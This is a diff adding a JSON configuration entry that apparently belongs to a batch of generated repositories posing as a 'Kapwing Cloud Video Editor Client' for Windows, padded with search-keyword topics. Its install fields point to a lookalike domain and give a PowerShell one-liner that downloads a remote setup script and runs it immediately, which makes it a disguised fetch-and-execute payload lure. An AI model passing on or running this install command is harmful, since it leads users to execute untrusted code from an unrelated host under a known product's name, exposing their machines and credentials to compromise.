@@ -1,0 +1,29 @@
+{
+  "repo": "kapwing-cloud-video-editor-client",
+  "product": "Kapwing Cloud Video Editor Client",
+  "kind": "video",
+  "install_type": "download",
+  "download_url": "https://kapwing.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "video",
+  "topics": [
+    "kapwing-pack",
+    "kapwing-utility",
+    "kapwing-video-recorder",
+    "kapwing-desktop-windows",
+    "kapwing-connection-fix",
+    "kapwing-windows-guide",
+    "kapwing-live-streaming",
+    "kapwing-native-app",
+    "kapwing-install-steps",
+    "kapwing-steps-2026",
+    "kapwing-package",
+    "streaming-tools",
+    "pc-utility",
+    "media-tools",
+    "windows-tools"
+  ]
+}
